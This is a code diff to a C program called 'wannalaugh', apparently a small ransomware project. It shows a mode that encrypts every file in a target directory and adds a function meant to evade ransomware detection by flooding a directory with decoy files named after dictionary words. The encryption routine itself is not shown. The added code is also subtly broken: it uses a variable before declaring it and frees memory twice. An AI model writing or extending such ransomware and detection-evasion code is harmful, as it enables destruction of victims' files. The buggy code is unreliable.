@@ -15,7 +15,7 @@
 
 void printUsage()
 {
-	printf("Usage: wannalaugh  -[e <directory>]  -[o <number of files>]\n");
+	printf("Usage: wannalaugh [vh] | -[e <directory>] | -[o <number of files>]\n");
 	printf("-e <directory>: Encrypts all files in the given directory\n");
 	printf("-o <filename>: Obfuscates ransom detection by creating Y files in the given directory\n");
 	printf("-v: Prints the current version.\n");
@@ -33,17 +33,18 @@ int main(int argc, char *argv[])
 {
 	int opt;
 
-	while ((opt = getopt(argc, argv, "hve:o:")) != -1)
+	if ((opt = getopt(argc, argv, "hve:o:")) != -1)
 	{
 		switch (opt)
 		{
 		case 'e':
-			// printf("Ransom mode: target directory = %s\n", optarg);
+			printf("Ransom mode: target directory = %s\n", optarg);
 			getFilenames(optarg);
-			break;
+			return 0;
 		case 'o':
 			printf("Obfuscate mode: number of files = %d\n", atoi(optarg));
-			break;
+			ObfuscateDir(atoi(optarg));
+			return 0;
 		case 'v':
 			printVersion();
 			exit(EXIT_SUCCESS);
@@ -57,6 +58,8 @@ int main(int argc, char *argv[])
 			exit(EXIT_FAILURE);
 		}
 	}
+	printUsage();
+	exit(EXIT_FAILURE);
 }
 
 void encryptFile(char *filename)
@@ -140,4 +143,40 @@ void getFilenames(char *directory)
 	}
 	else
 		perror("Couldn't open the directory");
+}
+
+void ObfuscateDir(int numOfFiles)
+{
+	char *dict_str;
+	size_t i = 0;
+	int filesCreated = 0;
+
+	if (numOfFiles < 1)
+		return;
+
+	FILE *dict_fd = fopen("/usr/share/dict/cracklib-small", "r");
+	if (dict_fd == NULL)
+	{
+		perror("Error opening dictionary");
+		return;
+	}
+
+	while (getline(&dict_str, &i, dict_fd) != -1 && filesCreated < numOfFiles)
+	{
+#ifdef _DEBUG_
+		printf("File to be created: %s\n", token);
+#endif
+
+		/* create new file based on the dictionary */
+		char *token = strtok(dict_str, "\n");
+		FILE *temp_fd = fopen(token, "w");
+		fclose(temp_fd);
+
+		filesCreated++;
+		/* clean up */
+		free(dict_str);
+		free(token);
+		dict_str = NULL;
+		i = 0;
+	}
 }
